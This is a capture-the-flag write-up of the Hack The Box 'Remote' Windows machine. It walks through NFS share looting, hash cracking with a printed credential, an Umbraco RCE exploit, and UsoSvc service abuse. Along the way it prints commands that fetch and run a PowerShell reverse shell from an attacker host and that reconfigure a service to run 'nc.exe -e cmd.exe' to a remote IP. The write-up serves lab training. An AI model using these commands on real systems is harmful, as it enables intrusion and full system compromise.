---
"title": "Hack The Box - Remote"
"date": 2020-09-05
"tags": ["windows", "easy", "nfs", "powerup"]
"keywords": ["windows", "easy", "nfs", "powerup"]
"categories": ["HackTheBox"]
"author": "Ghostbyt3"
"description": "This box is really a good and easy one. There ia a webpage running and we can find the backup of the webpage in NFS service. It contains username and password and the Web service have a CVE which helps to get shell and getting System is by Token Impersonatation."
"featured_image": "/img/htb-remote/Untitled.png"
"layout": "single"
"showTableOfContents": true
"authorbox": true
"pager": true
"toc": true
"mathjax": true
"sidebar": "right"
"subtitle": "HackTheBox - Writeup"
---


![Untitled](/img/htb-remote/Untitled.png)

This box is really a good and easy one. There ia a webpage running and we can find the backup of the webpage in NFS service. It contains username and password and the Web service have a CVE which helps to get shell and getting System is by Token  Impersonatation.

Link: [https://www.hackthebox.eu/home/machines/profile/234](https://www.hackthebox.eu/home/machines/profile/234)

Let's Begin with our Initial Nmap Scan.

## Nmap Scan Results

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 10 1511 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows Server 2008 SP2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 1m36s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-04-24T04:50:45
|_  start_date: N/A
```

## FTP Enumeration

I did `anonymous` login and there is nothing there.

```bash
root@w0lf:~# ftp 10.10.10.180
Connected to 10.10.10.180.
220 Microsoft FTP Service
Name (10.10.10.180:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```

## NFS Enumeration

Since the port `2049` is open and `nfs` service is also running on it. So there may be share is available.

- **Reference:** [https://resources.infosecinstitute.com/exploiting-nfs-share/](https://resources.infosecinstitute.com/exploiting-nfs-share/)

```bash
root@w0lf:~/CTF/HTB/Boxes/Remote# showmount -e 10.10.10.180
Export list for 10.10.10.180:
/site_backups (everyone)
root@w0lf:~/CTF/HTB/Boxes/Remote# mount 10.10.10.180:/site_backups ~/CTF/HTB/Boxes/Remote/mount
root@w0lf:~/CTF/HTB/Boxes/Remote# cd mount/
root@w0lf:~/CTF/HTB/Boxes/Remote/mount# ls
App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config
```

There is something called `Umbraco.`

**What is Umbraco?**

- Umbraco is an open-source content management system platform for publishing content on the World Wide Web and intranets. It is written in C# and deployed on Microsoft based infrastructure.

So this must be running on the WebServer. Let's confirm this now.

## HTTP:

> [http://10.10.10.180/umbraco](http://10.10.10.180/umbraco)

![Untitled](/img/htb-remote/Untitled%201.png)

There is a lot of files in the mounted share so I searched for any important files in `Umbraco` and found this.

![Untitled](/img/htb-remote/Untitled%202.png)

So it mentioned a file called `Umbraco.sdf` must contain user details.

Its not in readable format so I used `strings` 

```bash
root@w0lf:~/CTF/HTB/Boxes/Remote/mount/App_Data# strings Umbraco.sdf | less

Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

I take the `admin@htb.local` hash and cracked it using [Crackstation](https://crackstation.net/). `admin@htb.local : baconandcheese`

![Untitled](/img/htb-remote/Untitled%203.png)

While searching about `Umbraco` I found there is an exploit available for the version `7.12.4`. Let's confirm whether this is also same version.

```bash
root@w0lf:~/CTF/HTB/Boxes/Remote/mount# cat Web.config | grep umbracoConfigurationStatus
		[add key="umbracoConfigurationStatus" value="7.12.4" /](add key="umbracoConfigurationStatus" value="7.12.4" /)
root@w0lf:~/CTF/HTB/Boxes/Remote/mount#
```

Lets check whether this exploit works. [https://github.com/noraj/Umbraco-RCE](https://github.com/noraj/Umbraco-RCE)

```bash
root@w0lf:~/CTF/HTB/Boxes/Remote/Umbraco-RCE# python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c whoami
iis apppool\defaultapppool
```

It working, why don't we upload a reverse shell with nishang. I used `nishang/Shells/Invoke-PowerShellTcp.ps1` and copied that to my directory.

## Getting a Shell

### Step 1:

Started python server on my machine.

```bash
root@w0lf:~/CTF/HTB/Boxes/Remote# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

### Step 2:

If we look at the Shell it gives us some of the examples.

```bash
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444

Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port.
```

I copied the example and changed it to my IP and paste it at the bottom of the file.

![Untitled](/img/htb-remote/Untitled%204.png)

### Step 3:

Its time to run the exploit:

```bash
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.10.10.180' -c powershell.exe -a "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.6:8000/Invoke-PowerShellTcp.ps1')"
```

![Untitled](/img/htb-remote/Screenshot_2020-04-24_11-34-27.png)

We got the shell. And user flag is in `C:\Users\Public`

## Privilege Escalation

Uploaded [Powerup](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1) to the machine. Found something Interesting.

![Untitled](/img/htb-remote/Untitled%205.png)

There is a CVE available for this service, you can refer [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#example-with-windows-10---cve-2019-1322-usosvc) or you can also the PowerUP AbuseFunction command to abuse it.

By Following it, Uploaded `nc.exe` to the box.

```bash
certutil -urlcache -split -f http://10.10.14.6:8000/nc.exe
```

```bash
PS C:\Users\Public\Downloads> sc.exe stop UsoSvc
PS C:\Users\Public\Downloads> sc.exe config UsoSvc binpath= "C:\Users\Public\Downloads\nc.exe 10.10.14.6 5555 -e cmd.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Users\Public\Downloads> sc.exe qc usosvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: usosvc
        TYPE               : 20  WIN32_SHARE_PROCESS 
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\Public\Downloads\nc.exe 10.10.14.6 5555 -e cmd.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem
PS C:\Users\Public\Downloads> sc.exe start UsoSvc
```

We changed the Binary Path and If we restart the service. It will run my nc command.

And I got the shell

![Untitled](/img/htb-remote/Untitled%206.png)

We Own the Root!